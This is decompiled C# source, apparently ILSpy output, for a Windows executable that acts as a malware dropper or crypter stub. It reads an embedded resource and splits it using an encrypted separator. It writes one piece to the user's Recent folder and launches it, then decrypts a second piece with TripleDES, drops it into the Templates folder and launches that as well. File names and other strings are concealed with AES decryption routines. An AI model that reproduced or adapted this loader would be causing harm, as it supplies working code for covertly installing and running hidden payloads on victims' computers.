using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
public sealed class GClass0
{
	[STAThread]
	public static void Main()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string s = default(string);
		string[] array = default(string[]);
		string text = default(string);
		ResourceManager resourceManager = default(ResourceManager);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 401:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_001d;
						case 4:
							goto IL_003a;
						case 5:
							goto IL_0058;
						case 6:
							goto IL_0066;
						case 7:
							goto IL_00a8;
						case 8:
							goto IL_00cb;
						case 9:
							goto IL_00fa;
						case 10:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 11:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00fa:
					num = 9;
					File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + smethod_1("W+S7Yjk0nW3oNDwPEvIf5PcLTeJppiqY4O6SIPnffUI=", "m3K2CnPg10E"), Encoding.Default.GetBytes(s));
					break;
					IL_00cb:
					num = 8;
					s = smethod_0(array[Conversions.ToInteger(smethod_1("ySsBUl3WnofmhMcFtc1weQ==", "k1H6Kdp2TYa3t7"))], smethod_1("1kQxL0eAVwbML/J2NdfUgw==", "Tb1r9P0Ycq5XFo"), bool_0: true);
					goto IL_00fa;
					IL_0009:
					num = 2;
					text = smethod_1("Eq+LW38jx2fy0MjmrclmMi29uUWlwQgNTIFBQfFmAbo=", "Ýªæ7");
					goto IL_001d;
					IL_001d:
					num = 3;
					resourceManager = new ResourceManager(smethod_1("qOi9jF9L1MCEM2zCP7CRoBbV/KFMKBxmNf0zXAl8XfU=", "ªÄ3ñgTXkûÈµ2oÚºè0L"), Assembly.GetExecutingAssembly());
					goto IL_003a;
					IL_003a:
					num = 4;
					text2 = resourceManager.GetObject(smethod_1("nNlGlWKYCeas1KoWAJ6ECP/uxTxqJ2Mav2OQ6JcNTjo=", "ZîÃ9ºpiÁªP4í"))!.ToString();
					goto IL_0058;
					IL_0058:
					num = 5;
					array = Strings.Split(text2, text, -1, (CompareMethod)0);
					goto IL_0066;
					IL_0066:
					num = 6;
					File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Recent) + smethod_1("yMlsaL0NDTFJVJqvjjYCsCc5mFCY9HMWJXU1Lg8KDcg=", "Fi6c2WAm4w5RCd7"), Encoding.Default.GetBytes(array[Conversions.ToInteger(smethod_1("1ZzO/YJv0N64r6TKos2bAg==", "i1EDq43GfSj5z"))]));
					goto IL_00a8;
					IL_00a8:
					num = 7;
					Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Recent) + smethod_1("938ChR4RKCOBKjPq3oTNBRiRrqwZgfomZY5FzHEEc/Q=", "Yt5y8M7QxZd2f6"));
					goto IL_00cb;
					end_IL_0000_2:
					break;
				}
				num = 10;
				Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + smethod_1("QXP8vQexUqMZ255sGDOjhqq2rRLJ6R/i/Dlr9R32a1A=", "Xt42WcPq1z"));
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 401;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static string smethod_0(string string_0, string string_1, bool bool_0)
	{
		byte[] array = Convert.FromBase64String(string_0);
		byte[] array2;
		if (bool_0)
		{
			object obj = new MD5CryptoServiceProvider();
			array2 = (byte[])NewLateBinding.LateGet(obj, (Type)null, "ComputeHash", new object[1] { Encoding.UTF8.GetBytes(string_1) }, (string[])null, (Type[])null, (bool[])null);
		}
		else
		{
			array2 = Encoding.UTF8.GetBytes(string_1);
		}
		object obj2 = new TripleDESCryptoServiceProvider();
		NewLateBinding.LateSet(obj2, (Type)null, "Key", new object[1] { array2 }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(obj2, (Type)null, "Mode", new object[1] { CipherMode.ECB }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(obj2, (Type)null, "Padding", new object[1] { PaddingMode.PKCS7 }, (string[])null, (Type[])null);
		ICryptoTransform cryptoTransform = (ICryptoTransform)NewLateBinding.LateGet(obj2, (Type)null, "CreateDecryptor", new object[0], (string[])null, (Type[])null, (bool[])null);
		byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
		return Encoding.UTF8.GetString(bytes);
	}

	public static string smethod_1(string string_0, string string_1)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string empty = string.Empty;
		byte[] array = new byte[32];
		byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(string_1));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
		byte[] array2 = Convert.FromBase64String(string_0);
		return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
	}
}
